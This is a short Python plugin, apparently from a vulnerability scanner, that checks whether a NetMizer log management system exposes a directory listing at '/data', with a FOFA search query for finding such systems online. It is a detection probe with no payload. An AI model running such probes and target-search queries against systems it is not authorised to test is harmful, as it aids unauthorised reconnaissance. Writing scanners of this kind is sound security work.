#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/GOwTKgqf6_gvvLWJELArkQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'NetMizer日志管理系统目录遍历',

      'level'     :   'low',

      'fofa'      :   'title="NetMizer 日志管理系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/data'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'Index of /data.*?analys.*?config_object.*?',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret